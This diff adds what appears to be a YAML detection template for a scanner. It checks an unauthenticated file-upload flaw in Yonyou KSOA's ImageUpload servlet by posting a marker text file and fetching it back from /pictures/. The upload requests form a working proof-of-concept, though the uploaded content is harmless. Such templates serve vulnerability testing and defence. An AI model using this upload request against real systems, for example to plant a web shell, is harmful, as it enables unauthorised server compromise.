@@ -1,0 +1,32 @@
+Info:
+  description: yongyouKSOA_ImageUpload_upload
+
+Request:
+  re0:
+    method: POST
+    path: /servlet/com.sksoft.bill.ImageUpload?filename=ASFfgj26fds.txt&filepath=/ # 上传ASFfgj26fds.txt文件
+    headers:
+      Host: ${Host}
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36
+      Content-Length: '16'
+      Accept: '*/*'
+      Accept-Encoding: gzip, deflate
+      Connection: close
+    data: 'ASFfgj26fds'
+
+  re1:
+    method: GET
+    path: /pictures/ASFfgj26fds.txt
+    headers:
+      Host: ${Host}
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36
+      Content-Length: '16'
+      Accept: '*/*'
+      Accept-Encoding: gzip, deflate
+      Connection: close
+    data:
+
+Response:
+  status_code: 200
+  text_char: 'ASFfgj26fds'
+
